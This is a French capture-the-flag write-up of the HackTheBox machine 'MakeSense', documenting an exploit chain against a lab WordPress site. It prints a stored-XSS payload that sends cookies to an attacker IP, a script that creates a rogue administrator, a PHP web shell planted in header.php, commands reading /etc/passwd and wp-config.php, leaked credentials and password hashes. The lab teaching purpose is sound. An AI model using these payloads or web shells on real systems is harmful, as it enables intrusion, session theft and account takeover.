# MakeSense — HackTheBox (Medium)

> **Statut :** User flag obtenu — Root flag non obtenu (en cours).
> Cette box utilise un assistant vocal basé sur un modèle Whisper exécuté côté client, dont la transcription est exploitée pour une injection XSS stockée, menant à une RCE et un accès SSH.

---

## 1. Reconnaissance

### Scan des ports (Nmap)

Un scan complet (`-p- -T4`) révèle 4 ports ouverts :

| Port | Service | Détail |
|------|---------|--------|
| 22   | ssh     | OpenSSH 9.6p1 (Ubuntu) |
| 80   | http    | filtered |
| 443  | ssl/http | Apache 2.4.58, certificat `commonName=makesense.htb` |
| 8001 | vcom-tunnel | filtered — héberge généralement un service web interne |

Le port 443 héberge le site **WebAgency**, propulsé par **WordPress 7.0** avec une base de données **SQLite** (et non MySQL, malgré la configuration qui l'évoque). Le thème utilisé est un thème custom (`webagency`) chargeant plusieurs bibliothèques JS, dont `jQuery`, `Swiper`, et surtout un module maison : `whisper-wrapper.js`.

### Fuzzing web

`feroxbuster` sur `/` révèle entre autres :

- un fichier `.gitignore` exposé (fausse piste : le code source n'a pas pu être extrait via `git-dumper`)
- le thème custom complet accessible dans `wp-content/themes/webagency/`
- un fichier `whisper-wrapper.js` particulièrement intéressant (576 lignes)

### WPScan

`wpscan` confirme WordPress 7.0, le thème `webagency` v1.0, XML-RPC actif, et un répertoire d'upload avec listing activé.

---

## 2. Le widget vocal : analyse de la fonctionnalité

Le site propose un widget simulant un standard téléphonique. Son fonctionnement :

1. Le navigateur enregistre l'audio du visiteur et le convertit en WAV.
2. **Transformers.js** exécute entièrement côté client un modèle **Whisper-tiny.en** pour transcrire l'audio.
3. Le texte transcrit est résumé via un second modèle (**distilbart-cnn-12-6**).
4. Le résultat est chiffré en **AES-GCM** côté client, avec une clé secrète codée en dur dans le JS :
   ```
   ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
   ```
5. Le payload chiffré est envoyé au serveur WordPress via `admin-ajax.php`.

### La faille : mapping symbole ↔ mot-clé vocal

La fin du fichier `whisper-wrapper.js` contient une fonction `applySymbolMapping()` qui traduit des mots prononcés à l'oral en symboles techniques : `"open bracket"` → `<`, `"slash"` → `/`, `"quote"` → `'`, `"equal"` → `=`, etc.

Cette fonctionnalité, pensée pour permettre de dicter du code à l'oral, permet en réalité d'injecter n'importe quel caractère spécial dans la transcription — y compris une balise `<script>` complète — ouvrant la voie à une **XSS stockée**.

Comme la clé AES-GCM est codée en dur côté client et donc récupérable, il est possible de **reproduire le chiffrement côté attaquant** plutôt que de passer par la synthèse vocale : un script Python (`encrypt.py`) reproduit exactement le schéma de chiffrement du JS (dérivation SHA-256 de la clé, IV aléatoire de 12 octets, AES-GCM, concaténation IV + ciphertext, encodage Base64).

---

## 3. Exploitation — XSS stockée → vol de cookie

### Récupération du nonce et d'un `post_id` valide

L'endpoint `admin-ajax.php` exige un nonce WordPress valide et un `post_id` existant. Le nonce est récupéré directement depuis la page d'accueil :

```bash
curl -s https://makesense.htb --insecure | grep -o '"nonce":"[^"]*"'
# "nonce":"9e58004d6e"
```

Un `post_id` valide est obtenu en soumettant le formulaire de contact du site (action `submit_contact_form`), qui retourne un `post_id` exploitable pour l'action `save_voice_results`.

### Envoi du payload XSS chiffré

Le payload JS suivant est chiffré avec `encrypt.py` puis envoyé :

```javascript
<script>fetch('http://10.10.14.85:4444/?cookie=' + btoa(document.cookie));</script>
```

```bash
curl -X POST https://makesense.htb/wp-admin/admin-ajax.php \
     -F "action=save_voice_results" \
     -F "nonce=9e58004d6e" \
     -F "post_id=70" \
     -F "encrypted_payload=<payload_base64>" \
     --insecure
# {"success":true,"data":{"message":"Results saved successfully!","post_id":70}}
```

Ce payload est stocké puis exécuté par un **administrateur** consultant les résultats via le back-office (probablement un panel de révision des transcriptions, parcouru par un navigateur automatisé — un process Chrome headless piloté par Selenium a d'ailleurs été repéré côté serveur). Un listener `netcat` reçoit la requête :

```
GET /?cookie=d3Atc2V0dGluZ3MtdGltZS0zPTE3OTM3MzUwNjg= HTTP/1.1
```

Décodé en Base64 : `wp-settings-time-3=1793735068`. Ce cookie seul n'étant pas suffisant pour une prise de session complète, l'attaque est réorientée vers la **création directe d'un compte administrateur**.

---

## 4. Exploitation — création d'un compte admin via XSS

Un second payload (`encrypt_part2.py`) automatise, depuis le navigateur de la victime, la création d'un utilisateur WordPress avec le rôle `administrator` :

```javascript
fetch('/wp-admin/user-new.php')
  .then(response => response.text())
  .then(html => {
     var parser = new DOMParser();
     var doc = parser.parseFromString(html, 'text/html');
     var nonce = doc.getElementById('_wpnonce_create-user').value;

     var formData = new URLSearchParams();
     formData.append('action', 'createuser');
     formData.append('_wpnonce_create-user', nonce);
     formData.append('user_login', 'hacker');
     formData.append('email', 'hacker@makesense.htb');
     formData.append('pass1', 'P@ssword123!');
     formData.append('pass2', 'P@ssword123!');
     formData.append('role', 'administrator');

     return fetch('/wp-admin/user-new.php', { method: 'POST', body: formData });
  });
```

Le payload est chiffré, soumis via un nouveau post de contact, puis déclenché côté victime. Une fois le compte `hacker` créé avec le rôle administrateur, l'accès au panel `/wp-admin` est acquis.

---

## 5. Exploitation — RCE via le Theme File Editor

Avec un accès administrateur, le **Theme File Editor** de WordPress permet d'éditer directement les fichiers PHP du thème actif.

Une tentative d'injection dans `footer.php` :

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
    die();
}
?>
```

… ne fonctionne pas (probablement parce que ce fichier est inclus après l'envoi des headers/trop tard dans le flux). Le même code injecté en tête de **`header.php`** fonctionne :

```bash
curl -s "https://makesense.htb/?cmd=whoami" --insecure
# www-data
```

La commande s'exécute avec les droits de l'utilisateur **`www-data`**.

---

## 6. Énumération système via la RCE www-data

```bash
curl -s "https://makesense.htb/?cmd=cat+/etc/passwd" --insecure
```

révèle deux comptes système intéressants : **`walter`** (uid 1000) et **`admin`** (uid 1001). `www-data` n'a pas les droits de lister `/home/walter`.

### Fuite d'identifiants via `wp-config.php`

```bash
curl -s "https://makesense.htb/?cmd=cat+wp-config.php" --insecure
```

La configuration SQLite de WordPress contient des identifiants MySQL « factices » mais réutilisés comme véritables identifiants système :

```
DB_USER:     walter
DB_PASSWORD: JbhHDAEgXvri3!
```

---

## 7. Accès SSH et flag utilisateur

```bash
ssh walter@makesense.htb
# Welcome to Ubuntu 24.04.4 LTS
walter@makesense:~$ cat ~/user.txt
5af76809fa222de90dc747c4e908b877
```

---

## 8. Pistes d'escalade de privilèges explorées (non concluantes à ce stade)

Après l'obtention du shell `walter`, plusieurs pistes de reconnaissance ont été lancées sans succès pour l'instant :

- **`getcap -r /`** : seuls des binaires standards (`ping`, `mtr-packet`, `snap-confine`, `gst-ptp-helper`) possèdent des capabilities, rien d'exploitable identifié.
- **Fichiers inscriptibles** (`find / -writable -type f`) : uniquement des fichiers personnels de `walter` (`.bashrc`, `.ssh/authorized_keys`, etc.), rien côté système.
- **Crontab système** (`/etc/crontab`, `/etc/cron.d/`, `/etc/cron.daily/`) : jobs standards (`e2scrub_all`, `php`, `sysstat`, `apache2`, `apport`), rien d'évident à détourner pour l'instant.
- **Process root intéressants repérés** :
  - `php -S 127.0.0.1:8001 -t /root/ocr4/` — un service PHP local écoutant en loopback sur le port **8001**, lancé par **root**, servant apparemment un répertoire `/root/ocr4/`. Accessible en local via **tunnel SSH** (`ssh -L 8001:127.0.0.1:8001 walter@makesense.htb`) — piste la plus prometteuse, non encore exploitée à fond.
  - Un script `/root/.scripts/s...` lancé au démarrage par root (nom tronqué dans le `ps aux`, à creuser).
  - Une session `admin` active avec Chrome/Selenium (`webdriver-manager`, `/home/admin/.wdm/drivers/...`) — confirme l'automatisation déjà exploitée pour la XSS, pourrait aussi être une piste de pivot vers l'utilisateur `admin`.
- **Hash des utilisateurs WordPress** récupérés depuis la base SQLite via le tunnel SSH :
  ```
  admin|$wp$2y$10$kAvjqotf5pDs4BKKf51Toux6nYEu/mTI5Kd9mjf/XBy5BRcsR32YO
  walter|$wp$2y$10$RsVna8Ko6Vr3b6cA.6BRo.ROZvR0I9yodPpAPWeWxsqxdLqPImmay
  jake|$wp$2y$10$SigULBQTprmGuGFtHobro.A.Nz7XW4pQiR.oBH62orZGKOkmcpVMW
  hacker|$wp$2y$10$LpFHutS6lhhccr.35qy3IuRU8bGozUPi2VKgTLuAgwz8JOIHuuudK
  ```
  Pistes pour la suite : cassage offline des hashes `admin`/`jake`, et surtout investigation approfondie du service local sur le port 8001 (`/root/ocr4/`) qui semble être le point d'entrée le plus plausible vers root.

---

## 9. Résumé de la chaîne d'exploitation

```
Reconnaissance (nmap, feroxbuster, wpscan)
        ↓
Analyse du widget vocal → clé AES-GCM codée en dur dans le JS
        ↓
Reproduction du chiffrement côté attaquant (Python)
        ↓
XSS stockée via mapping vocal "mots → symboles" (whisper-wrapper.js)
        ↓
Création d'un compte administrateur WordPress via XSS (navigateur admin piloté)
        ↓
RCE via Theme File Editor (header.php) → www-data
        ↓
Fuite d'identifiants dans wp-config.php → walter:JbhHDAEgXvri3!
        ↓
SSH walter → user.txt
        ↓
[root.txt — en cours, piste : service PHP local root sur 8001 (/root/ocr4/)]
```

---

*Writeup en cours de rédaction — la partie privesc sera complétée une fois le flag root obtenu.*
